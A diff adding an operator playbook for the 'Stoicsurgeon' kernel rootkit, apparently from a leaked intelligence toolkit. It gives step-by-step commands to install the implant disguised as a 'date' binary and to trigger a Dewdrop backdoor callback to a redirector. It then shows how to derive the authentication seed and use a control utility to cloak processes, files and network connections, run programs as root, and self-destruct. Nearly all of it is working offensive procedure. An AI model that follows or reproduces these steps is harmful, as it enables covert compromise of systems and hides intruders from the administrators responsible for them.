@@ -1,0 +1,360 @@
+##### Stoicsurgeon Ctrl Usage, Installation and Troubleshooting Script #####
+
+### WARNING! READ THIS! WARNING! READ THIS! WARNING! READ THIS! WARNING! ###
+#
+# NEVER explicitly reference any cloaked file or directory from an unprivileged
+# process.  Wildcards are ok, but explicit references are not.  Stoic will
+# self-destruct if an explicit reference to a cloaked file ever occurs from an
+# unprivileged process.  This includes the cloaked directory, any files inside
+# the cloaked directory, any files/directories hidden after installation using
+# Ctrl, the /proc entry of cloaked processes, etc.
+#
+# Examples:
+# Assume /lib/.0123456789abcdef is a cloaked file or directory
+# -lt /lib/.0123456789abcdef ##### BAD BAD BAD BAD BAD #####
+# -lt /lib/.012*             ##### GOOD, WILL NOT SEE OUTPUT FOR CLOAKED DIR, 
+#                            ##### WILL NOT SELF-DESTRUCT
+#
+# Assume 12345 is a cloaked process
+# -lt /proc/12345/exe        ##### BAD BAD BAD BAD BAD #####
+# -lt /proc/*/exe            ##### GOOD, WILL NOT SEE OUTPUT FOR 12345 
+#                            ##### WILL NOT SELF-DESTRUCT
+#
+# The cloaked directory will be in one of the following directories:  
+# (the first one of these directories that exists and is on the same disk
+#  partition as the root of the filesystem "/", see output from "df" or
+#  "mount" commands)
+# -lt /var/tmp
+# -lt /lib
+# -lt /dev 
+# -lt /etc
+# -lt /
+#
+# Refer to what the `pwd` from triggering Dewdrop returned if possible
+#
+### END WARNING END WARNING END WARNING END WARNING END WARNING END WARNING ###
+
+
+########## Global Search/Replace commands ##########
+## Target IP: IP address of newly deployed STOIC
+## Target hostname: output from running "uname -n" on target
+## Callback port: port for DD to call back to connect to ish (usually random)
+## Redirector IP: IP for DD to call back to connect to ish
+
+### Target hostname MUST be output from "uname -n" on TARGET!!!!!!!!!! ###
+
+uname -n
+
+mx
+:%s/TARGET_IP/TARGET_IP/g
+:%s/TARGET_HOSTNAME/TARGET_HOSTNAME/g
+:%s/CALLBACK_PORT/CALLBACK_PORT/g
+:%s/REDIRECTOR_IP/REDIRECTOR_IP/g 
+'x
+
+
+
+############################################################################
+#####                          INSTALLATION                            #####
+############################################################################
+
+## First, make sure no other implants are installed, i.e. the family
+# If Solaris
+-strings /platform
+
+
+## We used to check here for the Solaris major version being too big.
+## Now, we just rely on installer to error out nicely if that is the case.
+## If you are trying to install on too new a version, you will get error 18:
+## 18 LOADER_ERROR_KERNEL_PLATFORM
+## 	Payload does not contain any kernel modules for this platform.
+## 
+
+
+showrev
+
+# If higher than these, DO NOT INSTALL and report this
+-problem untested solaris patch level MAJORVERSION_MINORVERSION
+
+## If installing on Linux, compare /proc/version with version being deployed 
+## Also compare hashes of installed kernels for another sanity check
+-cat /proc/version
+md5sum /boot/vmlinuz*
+
+## upload STOICSURGEON Installation Package
+-put /current/up/date date
+
+## run STOICSURGEON Installation Package
+PATH=. date
+
+## Take note of the Date that is displayed, "00" in the seconds field means SUCCESS
+## If the Seconds field does not show "00" take note of the entire date provided and   
+## save data via notes or "-problem".  A listing of possible values is located at the 
+## end of this script in the APPENDIX section.
+
+-problem stoicsurgeon failed install, the date string was OUTPUT_FROM_DATE
+
+## :30 error? On solaris 10, you get this if the kmdb module is loaded.
+## Temporary workaround (as of 30 OCT 2007) is to remove it.
+
+modinfo | grep kmdb
+
+## Remove kmdb (NOT kmdbmod), the NUM here is the first column
+
+## modunload -i NUM
+modinfo | grep kmdb
+
+## Then try again
+-put /current/up/date date
+PATH=. date
+
+
+###################################################
+### Trigger Dewdrop and verify SS is working ######
+###################################################
+
+### Below are commands to trigger DD without upload/execute, there
+### will be no Nopen session, will have a prompt in the "ish" shell
+### Possibility exists will have to play with options to ourtn/-irtun
+### to trigger on certain ports, etc.
+
+### Try THIS first (if redirecting from Nopen)
+-irtun TARGET_IP CALLBACK_PORT -Y5
+
+### or (if going direct)
+ourtn -Y5 -p CALLBACK_PORT TARGET_IP
+
+### for Dewdrop-3.X
+tipoff-3.X --trigger-address TARGET_IP --target-address TARGET_IP --target-protocol <tcp/udp> --target-port TARGET_PORT --callback-address CALLBACK_IP --callback-port CALLBACK_PORT --start-ish
+
+### look for output from "pwd" run after target calls back, the resulting
+### directory is the SS hidden directory
+
+## In Dewdrop window get the pid of DD connection to ish shell
+echo $$             
+
+## set DD PID in the rest of the script
+mx
+:%s/DEWDROP_PID/DEWDROP_PID/g
+`x
+
+## In un-elevated Nopen window, verify Dewdrop connection and processes are cloaked
+ps -ef | grep DEWDROP_PID
+netstat -an | grep CALLBACK_PORT
+
+## the hidden directory will be somewhere on the root filesystem, 
+## you can now do a directory listing of the hidden directory's parent
+## in the un-elevated Nopen window to determine that it is indeed hidden
+## (i.e. do "-ls /var/tmp" if hidden dir is "/var/tmp/.0123456789abcdef")
+##
+## REMINDER: DO NOT EXPLICITLY NAME HIDDEN FILES/DIRS FROM AN UNPRIVILEGED
+##           WINDOW (see top of script for more detailed explanation)
+-ls /var/tmp
+-ls /lib
+-ls /dev
+-ls /etc
+-ls /
+
+## Report any cloaking failures via notes or "-problem"
+
+#######################################################################
+#####      IF NO PROBLEMS ENCOUNTERED, INSTALLATION COMPLETE      #####
+#######################################################################
+
+
+
+#######################################################################
+#####         Ctrl Usage and Troubleshooting Instructions         #####
+#######################################################################
+
+### Should have at least two Nopen windows: one to become privileged, 
+### other to stay unprivileged, for comparing outputs of commands
+
+## get the PID of the Nopen window that will become privileged
+-pid
+
+## set Nopen PID in the rest of the script
+mx
+:%s/PRIVILEGED_NOPEN_PID/PRIVILEGED_NOPEN_PID/g
+`x
+
+# -s path	Set the times associated with a given file path
+# -g path	Get the times associated with a given file path
+########################################################
+## Ctrl Usage Options:
+#  -C [pid | /file/path]  Cloak the given process or file path
+#  -c [pid | /file/path]  Uncloak the given process or file path
+#  -d                     Display default cloaked directory
+#  -s /file/path atime atime_nsec mtime mtime_nsec ctime ctime_nsec
+#                         Set the times associated with a given file path
+#  -g /file/path          Get the times associated with a given file path
+#  -E pid                 Enable the given processes' ability to see
+#                         otherwise cloaked processes and files and call
+#                         into the kernel services.
+#  -e pid                 Disable the given processes' ability to see
+#                         otherwise cloaked processes and files and cal
+#                         into the kernel services.
+#  -F pid                 Enable the given processes' ability to see
+#                         otherwise cloaked files ONLY.
+#  -f pid                 Disable the given processes' ability to see
+#                         otherwise cloaked files ONLY.
+#  -P pid                 Enable the given processes' ability to see
+#                         otherwise cloaked processes ONLY.
+#  -p pid                 Disable the given processes' ability to see
+#                         otherwise cloaked processes ONLY.
+#  -K pid                 Designate a processes as to be killed upon
+#                         shutdown
+#  -k pid                 Designate a process as to NOT be killed upon
+#                         shutdown
+#  -r /bin/sh             Execute the given program as the root user
+#  -T signal              Send the specified signal to all killable cloaked
+#                         processes.
+# ONLY ONE OF EITHER THIS:
+# -U 		Invoke a full uninstall (self destruct)
+# -u 		Invoke a partial uninstall (unpatch and unload)
+# OR (WTF DID THEY SERIOUSLY DO TIHS?) TIHS:
+#  -u                     Invoke a full uninstall (self destruct)
+#  -n                     Invoke a partial uninstall (unpatch and unload)
+#
+########################################################
+
+## upload SS Control Utility using nopen
+-put /current/up/Ctrl c
+## or ftshell
+~~p /current/up/Ctrl c
+
+### If Nopen already a privileged process (i.e. started by a child of DD,
+### etc.), do not need to set SEED variable to use Ctrl, otherwise SEED
+### must be set
+
+## SEED calculation algorithm.  WARNING do this off target!!!
+      seedcalc TARGET_HOSTNAME
+## if you don't have 'seedcalc'
+      echo -n TARGET_HOSTNAME | rev | tr -d '\n' | md5sum | cut -f1 -d' '
+## if you don't have 'rev'
+      echo -n TARGET_HOSTNAME  | sed '/\n/!G;s/\(.\)\(.*\n\)/&\2\1/;//D;s/.//' | tr -d '\n' | md5sum | cut -f1 -d' '
+
+## set value of SEED in the rest of the script
+mx
+:%s/CALCULATED_SEED/CALCULATED_SEED/g
+`x
+
+## REMINDER: DO NOT USE THIS OUTPUT EXPLICITLY IN AN UNPRIVILEGED PROCESS WHEN 
+##           ACCESSING FILESYSTEM, SEE WARNING AT THE TOP OF THE SCRIPT
+
+## WARNING: WHEN CLOAKING PROCESSES, MUST MAKE SURE THAT NO CLOAKED PROCESS IS
+##          IS THE PARENT OF AN UNCLOAKED PROCESS.  IF NECESSARY TO HAVE A 
+##          PROCESS UNCLOAKED, MUST UNCLOAK PARENTS ALL THE WAY TO INIT (i.e. if
+##          need an uncloaked Nopen, Nopen listener must be uncloaked as well)
+
+## Use Ctrl to determine the name of the Cloaked directory
+SEED=CALCULATED_SEED PATH=. c -d
+
+## Use Ctrl to enable Nopen to see cloaked processes, connections and files.
+SEED=CALCULATED_SEED PATH=. c -E PRIVILEGED_NOPEN_PID
+
+## Use Ctrl to cloak the Nopen process, connections.  
+SEED=CALCULATED_SEED PATH=. c -C PRIVILEGED_NOPEN_PID
+
+## Optional - Designate Nopen to NOT be killed should the implant be 
+## shutdown (self-destruct).  You won't get any notification that this happened.
+SEED=CALCULATED_SEED PATH=. c -k PRIVILEGED_NOPEN_PID
+
+## Or, can do the above three actions in one command line
+SEED=CALCULATED_SEED PATH=. c -C PRIVILEGED_NOPEN_PID -E PRIVILEGED_NOPEN_PID -k PRIVILEGED_NOPEN_PID
+
+## can replace PRIVILEGED_NOPEN_PID with the PID of any process you'd like to hide
+
+## Find your nopen connections  -- consider narrowing the search as you probably also
+##                                already know your connection ip and port
+netstat -an | grep REDIRECTOR_IP
+
+## set Nopen Port in the rest of the script
+mx
+:%s/NOPEN_PORT/NOPEN_PORT/g
+`x
+
+## Find nopen using the privileged process. Verifies you can find Nopen in
+## ps and netstat listings when privileged
+ps -ef | grep PRIVILEGED_NOPEN_PID
+netstat -an |grep NOPEN_PORT
+
+## in an unprivileged window, these should unsuccessful if Nopen was cloaked
+## in an earlier Ctrl command
+ps -ef | grep PRIVILEGED_NOPEN_PID
+netstat -an | grep NOPEN_PORT
+
+## You should now be able to see the cloaked directory
+## The cloaked directory MAY be in one of the following.  Refer to what
+## the `pwd` from Dewdrop returned
+-lt /var/tmp
+-lt /lib
+-lt /dev 
+-lt /etc
+-lt /
+
+### APPENDIX
+## DATE Errors
+##
+###################################################################################
+## 01 LOADER_ERROR_UNKNOWN
+## 	The requested action failed for an unknown reason.
+## 02 LOADER_ERROR_MEMORY
+## 	There was a problem allocating memory.
+## 03 LOADER_ERROR_READ_FILE
+## 	There was a problem reading file data.
+## 04 LOADER_ERROR_EXTRACT_PAYLOAD
+## 	Could not extract payload data.
+## 05 LOADER_ERROR_INVALID_PAYLOAD
+## 	Payload data is invalid.
+## 06 LOADER_ERROR_MERGE_ARCHIVE
+## 	Could not merge old archive with new during an upgrade.
+## 07 LOADER_ERROR_GENERATE_PAYLOAD
+## 	Could not generate new payload data during an upgrade.
+## 08 LOADER_ERROR_BUFFER_TOO_SMALL
+## 	The given buffer is too small to hold the requested data.
+## 09 LOADER_ERROR_LIST_BUFFER_TOO_SMALL
+## 	The given array is too small to hold all the requested data elements.
+## 10 LOADER_ERROR_SYSINFO
+## 	Could not determine the host system information.
+## 11 LOADER_ERROR_ENUMERATE_PLATFORM_TAGS
+## 	Could not enumerate platform types.
+## 12 LOADER_ERROR_ENUMERATE_OBJECTS
+## 	Could not enumerate objects associated with a tag.
+## 13 LOADER_ERROR_READ_OBJECT
+## 	Could not read object data or meta-data.
+## 14 LOADER_ERROR_WRITE_OBJECT
+## 	Could not write object data or meta-data.
+## 15 LOADER_ERROR_LOAD_USER_MODULE_OBJECT
+## 	Could not load a user module data object.
+## 16 LOADER_ERROR_EXECUTE_OBJECT
+## 	Could not execute an executable data object.
+## 17 LOADER_ERROR_KERNEL_SHUTDOWN
+## 	Could not unload existing kernel modules.
+## 18 LOADER_ERROR_KERNEL_PLATFORM
+## 	Payload does not contain any kernel modules for this platform.
+## 19 LOADER_ERROR_KERNEL_INJECT
+## 	Could not inject modules into the running kernel.
+## 20 LOADER_ERROR_KERNEL_INVOKE
+## 	Could not invoke a required kernel service.
+## 21 LOADER_ERROR_PERSIST_ENABLE
+## 	Could not enable persistence.
+## 22 LOADER_ERROR_PERSIST_READ
+## 	Could not read persistant executable.
+## 23 LOADER_ERROR_HOSTID
+## 	Hostid of system did not match the one stored in the archive.
+## 24 LOADER_ERROR_EXECL
+## 	Error calling execl(3) when invoking the 64-bit version of the Loader.
+## 25 LOADER_ERROR_FORK
+## 	Error calling fork(2) when invoking the 64-bit version of the Loader.
+## 26 LOADER_ERROR_WAITPID
+## 	Error calling waitpid(2) when invoking the 64-bit version of the Loader.
+## 27 LOADER_ERROR_SIGACTION
+## 	Error calling sigaction(2) when setting the Loader process signal handlers.
+## 28 LOADER_ERROR_SIGADDSET
+## 	Error calling sigaddset(2) when setting the Loader process signal handlers.
+## 29 LOADER_ERROR_WRITE_FILE
+## 	Error writing file when dumping the 64-bit executable.
+## 30 LOADER_ERROR_KERNEL_DEBUGGING_ENABLED
+## 	Detected kernel debugging enabled at boot.
+###################################################################################
